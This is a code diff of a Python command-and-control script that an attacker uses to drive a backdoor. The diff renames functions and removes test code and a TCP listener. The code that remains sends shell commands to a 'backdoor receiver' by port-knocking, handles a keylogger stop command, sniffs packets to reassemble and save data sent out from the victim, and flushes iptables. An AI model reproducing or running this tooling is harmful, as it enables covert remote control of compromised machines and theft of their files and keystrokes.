@@ -92,29 +92,12 @@ config = Configuration()
 packet_list = {"instruction": 0, "session_name": "", "session_total": 0}
 
 
-def start_sender():
+def attacker_menu():
     """
     Initializes command line UI for attacker to send shell commands to a backdoor receiver.
     Calls port-knocking and listening for response for each commands sent.
     :return: None
     """
-
-    # with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
-
-    # with open(file="/root/Desktop/write_test/cool_cat.bmp", mode='rb') as file:  # b is important -> binary
-    #     fileContent = file.read()
-    # filename = "test.bmp"
-    # print(f"type fileContent: {type(fileContent)}")
-    # ef = encryption.encrypt(fileContent).decode('utf-8')
-    # print(f"type encrypt: {type(encryption.encrypt(fileContent))}")
-    # print(f"type ef: {type(ef)}")
-    # sf = encryption.decrypt(ef.encode('utf-8'))
-    # print(f"type sf: {type(sf)}")
-    #
-    # with open(file=f"/root/Desktop/write_test/{filename}", mode='wb') as file:
-    #     file.write(sf)
-    #
-    # return
 
     # Generate encryption key if needed. Ensure both sender and receiver have same key.
     encryption.generate_key()
@@ -122,12 +105,6 @@ def start_sender():
     # Read Configuration
     global config
     config = Configuration()
-    receiver_addr = config.receiver_address
-    port1 = config.receiver_port
-    port2 = config.receiver_port
-    port3 = config.receiver_port
-    sender_addr = config.sender_address
-    sender_port = config.sender_port
     delimiter = config.delimiter
 
     hostname = socket.gethostname()
@@ -188,8 +165,6 @@ def start_sender():
         elif user_input == "9":
             command = user_input
             send_port_knock(command)
-            print("Waiting for keylogger stop and transfer...")
-            time.sleep(2)
             print("Attacker Exiting.")
             break
         else:
@@ -205,8 +180,6 @@ def start_sender():
         # Send command with port-knocking.
         send_port_knock(command)
 
-        # Listen for backdoor response.
-        # data_server(IPAddr, sender_port)
 
     try:
         ipcmd_f = f'iptables -F'
@@ -319,12 +292,12 @@ def process_sniff_pkt(pkt):
         for idx in range(len(packet_list) - 3):
             complete_data += packet_list[str(idx+1)]
 
-        process_data(packet_list["instruction"], complete_data, packet_list["session_name"])
+        save_data(packet_list["instruction"], complete_data, packet_list["session_name"])
     else:
         return
 
 
-def process_data(instruction, data, file_name=""):
+def save_data(instruction, data, file_name=""):
     split_desc = file_name.rsplit(".", 1)
     filename = f"{split_desc[0]}-{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     if len(split_desc) > 1:
@@ -438,39 +411,9 @@ def send_port_knock(command):
     # send(port_knock_3, verbose=0)
 
 
-def data_server(address, port):
-    """
-    Creates a socket that listens for a single TCP response from the receiver backdoor.
-    Decrypts the data and closes the socket connection.
-    :param address: IP address
-    :param port: int of port
-    :return: None
-    """
-    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as IPv4_sock:
-        IPv4_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
-        IPv4_sock.bind((address, port))
-        IPv4_sock.listen(10)
-        # print("Listening on: ", IPv4_sock.getsockname())
-
-        # while True:
-        conn, addr = IPv4_sock.accept()
-
-        data_full = ''
-        while True:
-            data = conn.recv(1024).decode('utf-8')
-            if data:
-                data_full += data
-            else:
-                conn.close()
-                break
-        print(f"Encrypted Data: {data_full}")
-        decrypted_data = encryption.decrypt(data_full.encode('utf-8')).decode('utf-8')
-        print(f"Data: {decrypted_data}")
-
-
 if __name__ == "__main__":
     try:
-        start_sender()
+        attacker_menu()
     except KeyboardInterrupt as e:
         print("Attacker Shutdown")
         exit()
